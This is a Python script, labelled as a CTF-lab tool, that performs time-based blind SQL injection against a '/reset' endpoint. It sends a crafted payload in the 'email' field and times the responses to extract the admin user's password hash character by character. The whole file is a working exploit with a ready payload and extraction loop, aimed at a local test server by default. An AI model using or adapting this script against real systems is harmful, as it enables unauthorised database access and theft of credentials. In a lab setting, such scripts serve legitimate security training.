#!/usr/bin/env python3
from __future__ import annotations

import argparse
import string
import time
import urllib.parse
import urllib.request

DEFAULT_CHARSET = "0123456789abcdef"


def timed_post(url: str, data: dict[str, str]) -> tuple[str, float]:
    encoded = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=encoded)
    start = time.monotonic()
    with urllib.request.urlopen(req, timeout=10) as resp:
        body = resp.read().decode("utf-8")
    elapsed = time.monotonic() - start
    return body, elapsed


def main() -> None:
    parser = argparse.ArgumentParser(description="Timed SQLi extractor for the CTF lab.")
    parser.add_argument("--base-url", default="http://127.0.0.1:5000", help="App base URL")
    parser.add_argument("--delay", type=float, default=1.0, help="Sleep delay in seconds")
    parser.add_argument("--threshold", type=float, default=0.6, help="Timing threshold in seconds")
    parser.add_argument("--charset", default=DEFAULT_CHARSET, help="Characters to try")
    args = parser.parse_args()

    target = f"{args.base_url.rstrip('/')}/reset"
    charset = args.charset

    extracted = ""
    position = 1

    while True:
        found = False
        for ch in charset:
            payload = (
                "test' OR (CASE WHEN (SUBSTR((SELECT password_hash FROM users "
                "WHERE username='admin'),{pos},1)='{char}') THEN sleep({delay}) "
                "ELSE 0 END) -- "
            ).format(pos=position, char=ch, delay=args.delay)

            _, elapsed = timed_post(target, {"email": payload})
            if elapsed > args.threshold:
                extracted += ch
                print(f"[{position}] {extracted}", flush=True)
                position += 1
                found = True
                break

        if not found:
            break

    print(f"Extracted hash: {extracted}")


if __name__ == "__main__":
    main()
